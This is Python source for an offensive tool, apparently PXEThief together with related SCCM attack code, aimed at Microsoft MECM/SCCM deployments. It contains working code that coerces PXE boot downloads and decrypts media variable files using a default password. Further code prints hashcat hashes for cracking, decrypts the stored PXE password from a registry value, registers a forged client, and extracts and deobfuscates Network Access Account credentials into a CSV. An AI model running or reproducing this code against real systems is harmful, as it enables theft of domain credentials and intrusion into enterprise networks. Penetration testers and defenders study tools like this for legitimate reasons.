    sccm_base_url = SCCM_BASE_URL
    session = requests.Session()
    
    if USING_TLS:
        session.verify = False
        session.cert = (CERT_FILE,KEY_FILE)
        #requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key')) # supporting client certs
    if USING_PROXY:
        proxies = {"https":'127.0.0.1:8080'}
        session.proxies = proxies
    
    #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
    print("[+] Retrieving x64UnknownMachineGUID from MECM MP...")
    r = session.get(sccm_base_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")

    #Parse XML and retrieve x64UnknownMachineGUID
    root = ET.fromstring(r.text)
    clientID = root.find("UnknownMachines").get("x64UnknownMachineGUID")
    clientID = root.find("UnknownMachines").get("x86UnknownMachineGUID")
    sitecode = root.find("SITECODE").text

    if DUMP_MPKEYINFORMATIONMEDIA_XML:
        f = open("MPKEYINFORMATIONMEDIA.xml", "w")
        f.write(r.text)
        f.close()

    #Add UTF-16-LE Byte Order Mark (BOM)
    first_payload = b'\xFF\xFE' + ('<Msg><ID/><SourceID>' + clientID + '</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:' + CCMClientID + ';' + CCMClientTimestamp + '\r\nClientTokenSignature:' + clientTokenSignature +'\r\n]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>').encode("utf-16-le")
    second_payload = ('<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:' + sitecode + '</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>' + clientID + '</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>\r\n').encode("utf-16-le") + b'\x00\x00\x00'

    me = MultipartEncoder(fields={'Msg': (None, first_payload, "text/plain; charset=UTF-16"), 'RequestAssignments': second_payload})
    print("[+] Requesting policy assignments from MP...")
    r = session.request("CCM_POST",sccm_base_url + "/ccm_system/request", data=me, headers={'Content-Type': me.content_type.replace("form-data","mixed")})

    multipart_data = MultipartDecoder.from_response(r)

    #Get the zlib compressed policy locations and parse out the URLs for NAAConfig and TaskSequence
    policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
    wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())

    if DUMP_REPLYASSIGNMENTS_XML:
        f = open("ReplyAssignments.xml", "w")
        f.write(wf_policy_xml)
        f.close()
    
    #Pull relevant configs from RequestAssignments XML
    allPoliciesURLs = {}

    root = ET.fromstring(wf_policy_xml)
    policyAssignments = root.findall("PolicyAssignment")
    dedup = 0

    for policyAssignment in policyAssignments:
        policies = policyAssignment.findall("Policy")
        for policy in policies:
            if policy.get("PolicyCategory") not in allPoliciesURLs and policy.get("PolicyCategory") is not None:
                allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
            else:
                if policy.get("PolicyCategory") is None:
                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in "\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
                else:
                    allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
                    dedup = dedup + 1

    print("[+] " + str(len(allPoliciesURLs)) + " policy assignment URLs found!")

#    headers = {'CCMClientID': CCMClientID, "CCMClientIDSignature" : CCMClientIDSignature, "CCMClientTimestamp" : CCMClientTimestamp, "CCMClientTimestampSignature" : CCMClientTimestampSignature}
    now = datetime.datetime.now(datetime.timezone.utc)
    headers = {"Connection": "close","User-Agent": "ConfigMgr Messaging HTTP Sender"}
    headers["ClientToken"] = "{};{}".format(
            CCMClientID.upper(),
            now.strftime(dateFormat1)
          )
    headers["ClientTokenSignature"] = CryptoTools.signNoHash(key, "{};{}".format(CCMClientID.upper(), now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
       
    if DUMP_POLICIES: 
        POLICY_FOLDER_PREFIX = SCCM_BASE_URL[7:].lstrip("/").rstrip("/")
        #Dump all config XMLs to disk - Uncomment to write to policies/*.xml
        policy_folder = os.getcwd() + "/" + POLICY_FOLDER_PREFIX + "_policies/"
        os.mkdir(policy_folder)
        for category, url in allPoliciesURLs.items():
            if category is not None:
                print("[+] Requesting " + category + " from: " + url)
                content = session.get(url, headers=headers)
                f = open(policy_folder + category + ".xml", "wb")
                f.write(content.content)
                f.close()
            
    colsettings = []
    naaconfig = []
    tsconfig = []
    for category, url in allPoliciesURLs.items():
        if "NAAConfig" in category:
            print("[+] Requesting Network Access Account Configuration from: " + url)
            naaconfig.append(session.get(url, headers=headers))
        if "TaskSequence" in category:
            print("[+] Requesting Task Sequence Configuration from: " + url)
            tsconfig.append(session.get(url, headers=headers))
        if "CollectionSettings" in category:
            print("[+] Requesting Collection Settings from: " + url)
            colsettings.append(session.get(url, headers=headers))

    return naaconfig,tsconfig,colsettings

def write_default_config_file():    
    config = configparser.ConfigParser(allow_no_value=True)

    config['SCAPY SETTINGS'] = {}
    scapy = config['SCAPY SETTINGS']
    scapy["AUTOMATIC_INTERFACE_SELECTION_MODE"] = "1" #implemented
    scapy["MANUAL_INTERFACE_SELECTION_BY_ID"] = ""

    config['HTTP CONNECTION SETTINGS'] = {}
    http = config['HTTP CONNECTION SETTINGS']
    http["USE_PROXY"] = "0"
    http["USE_TLS"] = "0"

    config['GENERAL SETTINGS'] = {}
    general = config['GENERAL SETTINGS'] 
    general["SCCM_BASE_URL"] = ""
    general["AUTO_EXPLOIT_BLANK_PASSWORD"] = "1" #implemented

    with open('settings.ini', 'w') as configfile:
      config.write(configfile)

def main():
    name = r""" 
 ________  ___    ___ _______  _________  ___  ___  ___  _______   ________ 
|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\
\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/ 
 \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\
  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_|
   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\ 
    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__| 
          |__|/ \|__|                                                       
"""
    print(name)

    if len(sys.argv) < 2 or sys.argv[1] == "-h":

        print("%s 1 - Automatically identify and download encrypted media file using DHCP PXE boot request. Additionally, attempt exploitation of blank media password when auto_exploit_blank_password is set to 1" % sys.argv[0])
        print("%s 2 <IP Address of DP Server> - Coerce PXE Boot against a specific MECM Distribution Point server designated by IP address" % sys.argv[0])
        print("%s 3 <variables-file-name> <Password-guess> - Attempt to decrypt a saved media variables file and retrieve sensitive data from MECM DP" % sys.argv[0])
        print("%s 4 <variables-file-name> <policy-file-path> <password> - Attempt to decrypt a saved media variables file and Task Sequence XML file retrieved from a full TS media" % sys.argv[0])
        print("%s 5 <variables-file-name> - Print the hash corresponding to a specified media variables file for cracking in hashcat" % sys.argv[0])
        print("%s 6 <identityguid> <identitycert-file-name> - Retrieve task sequences using the values obtained from registry keys on a DP" % sys.argv[0])
        print("%s 7 <Reserved1-value> - Decrypt stored PXE password from SCCM DP registry key (reg query HKLM\software\microsoft\sms\dp /v Reserved1)" % sys.argv[0])
        print("%s 8 - Write new default settings.ini file in PXEThief directory" % sys.argv[0])
        print("%s 10 - Print Scapy interface table to identify interface indexes for use in 'settings.ini'" % sys.argv[0])

    elif int(sys.argv[1]) == 10:

        print_interface_table()

    elif int(sys.argv[1]) == 1:
        #Use DHCP to find PXE Server
        print("[+] Finding and downloading encrypted media variables file from MECM server...")
        configure_scapy_networking(None)
        get_pxe_files(None)

    elif int(sys.argv[1]) == 2:
        #Try to directly access user specified DP
        if len(sys.argv) != 3:
            print("Usage:   %s 2 <ip addess of MECM server>" % sys.argv[0])
            sys.exit(0)
        
        print("[+] Generating and downloading encrypted media variables file from MECM server located at " + sys.argv[2])
        configure_scapy_networking(sys.argv[2])
        get_pxe_files(sys.argv[2])

    elif int(sys.argv[1]) == 3:
        #Decrypt media variables file using password
        print("[+] Attempting to decrypt media variables file and retrieve policies and passwords from MECM Server...")

        if not (len(sys.argv) == 4 or len(sys.argv) == 3): 
            print("Usage:   %s 3 <variables-file-name> <Password-guess>" % sys.argv[0])
            sys.exit(0)
        
        if len(sys.argv) == 3:
            print("[+] User did not supply password. Making use of default MECM media variables password (only works for non-password protected media)")
            password = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
        else:
            password = sys.argv[3]

        path = sys.argv[2]
        media_variables = decrypt_media_file(path,password)
        print("[!] Writing media variables to variables.xml")
        write_to_file("variables",media_variables) 
    
        #Parse media file in order to pull out PFX password and PFX bytes
        root = ET.fromstring(media_variables.encode("utf-16-le"))
        smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text 
        smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
        smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
        filename = smsMediaSiteCode + "_" + smsMediaGuid +"_SMSTSMediaPFX.pfx"
    
        print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
        write_to_binary_file(filename,smsTSMediaPFX)
        check_clientauthcert(filename, smsMediaGuid)
        process_pxe_bootable_and_prestaged_media(media_variables)

    elif int(sys.argv[1]) == 4:
        print("[+] Attempting to decrypt encrypted media variables file and policy from stand-alone media...")

        if not (len(sys.argv) == 4 or len(sys.argv) == 5):
            print("Usage:   %s 4 <variables-file-name> <policy-file-path> <password>" % sys.argv[0])
            sys.exit(0)

        if len(sys.argv) == 4:
            print("[+] User did not supply password. Making use of default MECM media password")
            password = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
        else:
            password = sys.argv[4]

        path = sys.argv[2]
        policy_file = sys.argv[3]

        if password == "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}":
            #If no password is set for Full Media, default password is used for Media Variables and _SMSMediaGuid variable is used for policy password
            media_variables = decrypt_media_file(path,password)
            root = ET.fromstring(media_variables.encode("utf-16-le"))
            smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text
            process_full_media(smsMediaGuid,policy_file)
        else:
            #If a user supplied password is used, the key derived is used decrypt both Policy.xml and the media variables file            
            #print(decrypt_media_file(path,password))
            process_full_media(password,policy_file)
    elif int(sys.argv[1]) == 5:
        print("Hashcat hash: " + "$sccm$aes128$" + read_media_variable_file_header(sys.argv[2]).hex())

    elif int(sys.argv[1]) == 6:
        print("[+] Using MECM PXE Certificate registry key values to retrieve task sequences")
        
        identity = sys.argv[2]
        print("identityguid: " + identity)
        print("Path to file with identitycert value: " + sys.argv[3])
        
        f = open(sys.argv[3], "r")
        cert = f.read()
        f.close()
        
        dowload_and_decrypt_policies_using_certificate(identity,cert)

    elif int(sys.argv[1]) == 7:
        print("[+] Decrypt stored PXE password from SCCM DP registry key Reserved1")
        reserved = deobfuscate_credential_string(sys.argv[2])
        print("PXE Password: " + reserved[:reserved.rfind('\x00')])

    elif int(sys.argv[1]) == 8:
        print("[+] Writing new 'settings.ini' file to PXEThief folder with default values")
        write_default_config_file()

if __name__ == "__main__":
    main()

import sys
import base64
from Crypto.Cipher import AES,DES3
from hashlib import *
import binascii

def read_media_variable_file(filename):
    media_file = open(filename,'rb')
    media_file.seek(24)
    media_data = media_file.read()
    return media_data[:-8]

def aes_des_key_derivation(password):
    
    key_sha1 = sha1(password).digest()
    
    b0 = b""
    for x in key_sha1:
        b0 += bytes((x ^ 0x36,))
        
    b1 = b""
    for x in key_sha1:
        b1 += bytes((x ^ 0x5c,))

    # pad remaining bytes with the appropriate value
    b0 += b"\x36"*(64 - len(b0))
    b1 += b"\x5c"*(64 - len(b1))
         
    b0_sha1 = sha1(b0).digest()
    b1_sha1 = sha1(b1).digest()
    
    return b0_sha1 + b1_sha1

def aes128_decrypt(data,key,iv=b"\x00"*16):

    aes128 = AES.new(key, AES.MODE_CBC, iv)
    decrypted = aes128.decrypt(data)
    return decrypted.decode("utf-16-le")

def aes128_decrypt_raw(data,key,iv=b"\x00"*16):

    aes128 = AES.new(key, AES.MODE_CBC, iv)
    decrypted = aes128.decrypt(data)
    return decrypted

def aes256_decrypt(data,key,iv=b"\x00"*16):

    aes256 = AES.new(key, AES.MODE_CBC, iv)
    decrypted = aes256.decrypt(data)
    return decrypted.decode("utf-16-le")

def aes256_decrypt_raw(data,key,iv=b"\x00"*16):

    aes256 = AES.new(key, AES.MODE_CBC, iv)
    decrypted = aes256.decrypt(data)
    return decrypted

def _3des_decrypt(data,key,iv=b"\x00"*8):

    _3des = DES3.new(key, DES3.MODE_CBC, iv)
    decrypted = _3des.decrypt(data)
    return decrypted.decode("utf-16-le")

def _3des_decrypt_raw(data,key,iv=b"\x00"*8):

    _3des = DES3.new(key, DES3.MODE_CBC, iv)
    decrypted = _3des.decrypt(data)
    return decrypted

def read_media_variable_file_header(filename):
    media_file = open(filename,'rb')
    media_data = media_file.read(40)
    return media_data

import datetime
import zlib
import requests
import re
import time
import os
from pyasn1.codec.der.decoder import decode
from pyasn1_modules import rfc5652
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, ciphers, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.x509 import ObjectIdentifier
from requests_toolbelt.multipart import decoder
from requests_ntlm import HttpNtlmAuth
import xml.etree.ElementTree as ET
import sqlite3
import csv
import shutil


# Who needs just 1 date format :/
dateFormat1 = "%Y-%m-%dT%H:%M:%SZ"
dateFormat2 = "%Y%m%d%H%M%S.000000+000"
dateFormat3 = "%m/%d/%Y %H:%M:%S"

now = datetime.datetime.utcnow()

# Huge thanks to @_Mayyhem with SharpSCCM for making requesting these easy!
registrationRequestWrapper = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
registrationRequest = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}"><AgentInformation AgentIdentity="CCMSetup.exe" AgentVersion="5.00.8325.0000" AgentType="0" /><Certificates><Encryption Encoding="HexBinary" KeyType="1">{encryption}</Encryption><Signing Encoding="HexBinary" KeyType="1">{signature}</Signing></Certificates><DiscoveryProperties><Property Name="Netbios Name" Value="{client}" /><Property Name="FQ Name" Value="{clientfqdn}" /><Property Name="Locale ID" Value="2057" /><Property Name="InternetFlag" Value="0" /></DiscoveryProperties></Data>"""
msgHeader = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
msgHeaderPolicy = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
policyBody = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
reportBody = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><ReportBody /></Report>"""

class Tools:
  @staticmethod
  def encode_unicode(input):
    # Remove the BOM
    return input.encode('utf-16')[2:]

  @staticmethod
  def write_to_file(input, file):
    with open(file, "w", encoding='utf-8') as fd:
      fd.write(input)
  
  @staticmethod
  def write_to_csv(input, logs_dir):
      fields = ["username", "password"]
      file = f"{logs_dir}/csvs/naa_creds.csv"
      with open(file, 'a', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=fields, escapechar='\\')
            writer.writeheader()
            writer.writerows(input)
      #logger.info(f"[+] NAA credentials saved to {file}")



class CryptoTools:
    @staticmethod
    def createCertificateForKey(key, cname):
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, cname),
        ])
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow() - datetime.timedelta(days=2)
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.KeyUsage(digital_signature=True, key_encipherment=False, key_cert_sign=False,
                                  key_agreement=False, content_commitment=False, data_encipherment=True,
                                  crl_sign=False, encipher_only=False, decipher_only=False),
            critical=False,
        ).add_extension(
            # SMS Signing Certificate (Self-Signed)
            x509.ExtendedKeyUsage([ObjectIdentifier("1.3.6.1.4.1.311.101.2"), ObjectIdentifier("1.3.6.1.4.1.311.101")]),
            critical=False,
        ).sign(key, hashes.SHA256())

        return cert

    @staticmethod
    def generateRSAKey():
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        return key

    @staticmethod
    def buildMSPublicKeyBlob(key):
        # Built from spec: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/ade9efde-3ec8-4e47-9ae9-34b64d8081bb
        blobHeader = b"\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00"
        blob = blobHeader + key.public_key().public_numbers().n.to_bytes(int(key.key_size / 8), byteorder="little")
        return blob.hex().upper()

    # Signs data using SHA256 and then reverses the byte order as per SCCM
    @staticmethod
    def sign(key, data):
        signature = key.sign(data, PKCS1v15(), hashes.SHA256())
        signature_rev = bytearray(signature)
        signature_rev.reverse()
        return bytes(signature_rev)

    # Same for now, but hints in code that some sigs need to have the hash type removed
    @staticmethod
    def signNoHash(key, data):
        signature = key.sign(data, PKCS1v15(), hashes.SHA256())
        signature_rev = bytearray(signature)
        signature_rev.reverse()
        return bytes(signature_rev)

    @staticmethod
    def decrypt(key, data):
        print(key.decrypt(data, PKCS1v15()))

    @staticmethod
    def decrypt3Des(key, encryptedKey, iv, data):
        desKey = key.decrypt(encryptedKey, PKCS1v15())

        cipher = Cipher(algorithms.TripleDES(desKey), modes.CBC(iv))
        decryptor = cipher.decryptor()
        return decryptor.update(data) + decryptor.finalize()

class SCCMTools():

    def __init__(self, target_name, target_fqdn, target_sccm, target_username, target_password, sleep, logs_dir):
        self._server = target_sccm
        self._serverURI = f"http://{self._server}"
        self._target_name = target_name
        self._target_fqdn = target_fqdn
        self.target_username = target_username
        self.target_password = target_password
        self.sleep = sleep
        self.logs_dir = logs_dir

    def sendCCMPostRequest(self, data, auth=False, username="", password="", mp = "", headers=None):
        if headers == None:
            headers = {
                "Connection": "close",
                "User-Agent": "ConfigMgr Messaging HTTP Sender",
                "Content-Type": "multipart/mixed; boundary=\"aAbBcCdDv1234567890VxXyYzZ\""
           }
        #for manual retrieval
        if mp:
            self._serverURI = mp
        if auth:
            r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system_windowsauth/request", headers=headers, data=data, auth=HttpNtlmAuth(username, password))
        else:
            r = self.sendCCMPostRequestWithOutAuth(data, headers)
        if r:
            multipart_data = decoder.MultipartDecoder.from_response(r)
            for part in multipart_data.parts:
                if part.headers[b'content-type'] == b'application/octet-stream':
                    return zlib.decompress(part.content).decode('utf-16')
                else:
                    pass

            
    def sendCCMPostRequestWithOutAuth(self, data, headers):
        r = requests.request("CCM_POST", f"{self._serverURI}/ccm_system/request", headers=headers, data=data)
        #check if the response actually has a body, if not sleep and try again
        if r.headers.get('Content-Length') == "0":
            #logger.info(f"[*] Policy isn't ready yet, sleeping {self.sleep} seconds.")
            time.sleep(5)
            return self.sendCCMPostRequestWithOutAuth(data, headers)
        else:
            #logger.debug("[*] Policy available, decoding")
            multipart_data = decoder.MultipartDecoder.from_response(r)
            for part in multipart_data.parts:
                if part is not None and part.headers[b'content-type'] == b'application/octet-stream':
                    try:
                        decompressed = zlib.decompress(part.content).decode('utf-16')
                        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", decompressed, re.DOTALL + re.MULTILINE)
                        if result:

                            return r
                    except Exception as e:
                        print(e)

    

    def requestPolicy(self, url, clientID="", authHeaders=False, retcontent=False, key=""):
        headers = {
            "Connection": "close",
            "User-Agent": "ConfigMgr Messaging HTTP Sender"
        }

        if authHeaders == True:
          headers["ClientToken"] = "GUID:{};{};2".format(
            clientID, 
            now.strftime(dateFormat1)
          )
          #for manual retrieval
          if key:
              self.key = key
          headers["ClientTokenSignature"] = CryptoTools.signNoHash(self.key, "GUID:{};{};2".format(clientID, now.strftime(dateFormat1)).encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
        r = requests.get(f"{self._serverURI}"+url, headers=headers)
        if retcontent == True:
          return r.content
        else:
          return r.text

    def createCertificate(self, writeToTmp=False):
        self.key = CryptoTools.generateRSAKey()
        self.cert = CryptoTools.createCertificateForKey(self.key, u"ConfigMgr Client")


        if writeToTmp:
            #with open("/tmp/key.pem", "wb") as f:
            with open(f"{os.getcwd()}/key.pem", "wb") as f:
                f.write(self.key.private_bytes(
                    encoding=serialization.Encoding.PEM, 
                    format=serialization.PrivateFormat.TraditionalOpenSSL, 
                    encryption_algorithm=serialization.BestAvailableEncryption(b"mimikatz"),
                ))

            with open(f"{os.getcwd()}/certificate.pem", "wb") as f:
                f.write(self.cert.public_bytes(serialization.Encoding.PEM))

    def sendRegistration(self, name, fqname, username, password):
        b = self.cert.public_bytes(serialization.Encoding.DER).hex().upper()

        embedded = registrationRequest.format(
          date=now.strftime(dateFormat1), 
          encryption=b, 
          signature=b, 
          client=name, 
          clientfqdn=fqname
        )

        signature = CryptoTools.sign(self.key, Tools.encode_unicode(embedded)).hex().upper()
        request = Tools.encode_unicode(registrationRequestWrapper.format(data=embedded, signature=signature)) + "\r\n".encode('ascii')

        header = msgHeader.format(
          bodylength=len(request)-2, 
          client=name, 
          date=now.strftime(dateFormat1), 
          sccmserver=self._server
        )

        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + zlib.compress(request) + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

        deflatedData = self.sendCCMPostRequest(data, True, username, password)
        r = re.findall("SMSID=\"GUID:([^\"]+)\"", deflatedData)
        if r != None:
            return r[0]

        return None

    def sendPolicyRequest(self, name, fqname, uuid, targetName, targetFQDN, targetUUID):
        body = Tools.encode_unicode(policyBody.format(clientid=targetUUID, clientfqdn=targetFQDN, client=targetName)) + b"\x00\x00\r\n"
        payloadCompressed = zlib.compress(body)

        bodyCompressed = zlib.compress(body)
        public_key = CryptoTools.buildMSPublicKeyBlob(self.key)
        clientID = f"GUID:{uuid.upper()}"
        clientIDSignature = CryptoTools.sign(self.key, Tools.encode_unicode(clientID) + "\x00\x00".encode('ascii')).hex().upper()
        payloadSignature = CryptoTools.sign(self.key, bodyCompressed).hex().upper()

        header = msgHeaderPolicy.format(
          bodylength=len(body)-2, 
          sccmserver=self._server, 
          client=name, 
          publickey=public_key, 
          clientIDsignature=clientIDSignature, 
          payloadsignature=payloadSignature, 
          clientid=uuid, 
          date=now.strftime(dateFormat1)
        )

        data = "--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n".encode('ascii') + header.encode('utf-16') + "\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n".encode('ascii') + bodyCompressed + "\r\n--aAbBcCdDv1234567890VxXyYzZ--".encode('ascii')

        with open (f"{self.logs_dir}/{uuid}.data", "wb") as f:
            f.write(data)
        deflatedData = self.sendCCMPostRequest(data)
        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
        return [result.group(1)]


    def parseEncryptedPolicy(self, result):
        # Man.. asn1 suxx!
        content, rest = decode(result, asn1Spec=rfc5652.ContentInfo())
        content, rest = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
        encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
        iv = content['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
        body = content['encryptedContentInfo']['encryptedContent'].asOctets()

        decrypted = CryptoTools.decrypt3Des(self.key, encryptedRSAKey, iv, body)
        policy = decrypted.decode('utf-16')
        return policy
    
    def rename_key(self, uuid):
       key = f"{os.getcwd()}/key.pem"
               # with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
        #     key = g.read()
       newkey = f"{self.logs_dir}/{uuid}.pem"
       if uuid:
          shutil.copy(key, newkey)


#### Huge shoutout to @SkelSec for this code
#### https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py

    def mscrypt_derive_key_sha1(self, secret:bytes):
        # Implementation of CryptDeriveKey(prov, CALG_3DES, hash, 0, &cryptKey);
        buf1 = bytearray([0x36] * 64)
        buf2 = bytearray([0x5C] * 64)

        digest = hashes.Hash(hashes.SHA1(), backend=default_backend())
        digest.update(secret)
        hash_ = digest.finalize()

        for i in range(len(hash_)):
            buf1[i] ^= hash_[i]
            buf2[i] ^= hash_[i]

        digest1 = hashes.Hash(hashes.SHA1(), backend=default_backend())
        digest1.update(buf1)
        hash1 = digest1.finalize()

        digest2 = hashes.Hash(hashes.SHA1(), backend=default_backend())
        digest2.update(buf2)
        hash2 = digest2.finalize()

        derived_key = hash1 + hash2[:4]
        return derived_key

    def deobfuscate_policysecret(self, output:str or bytes):
        if isinstance(output, str):
            output = bytes.fromhex(output)

        data_length = int.from_bytes(output[52:56], 'little')
        buffer = output[64:64+data_length]

        key = self.mscrypt_derive_key_sha1(output[4:4+0x28])
        iv = bytes([0] * 8)
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(buffer) + decryptor.finalize()

        padder = padding.PKCS7(64).unpadder() # 64 is the block size in bits for DES3
        decrypted_data = padder.update(decrypted_data) + padder.finalize()
        return decrypted_data


    def parse_xml(self, xml_file):
        try:
            #might need to update this if the weird extra character isn't consistent from the file write

            index = xml_file.find("</Policy>")
            if index != -1:
                clean = xml_file[:index + len("</Policy>")]

            i = ET.fromstring(clean)
            for instance in i.findall(".//instance[@class='CCM_NetworkAccessAccount']"):
                network_access_username = instance.find(".//property[@name='NetworkAccessUsername']/value").text
                network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
                clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
                clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
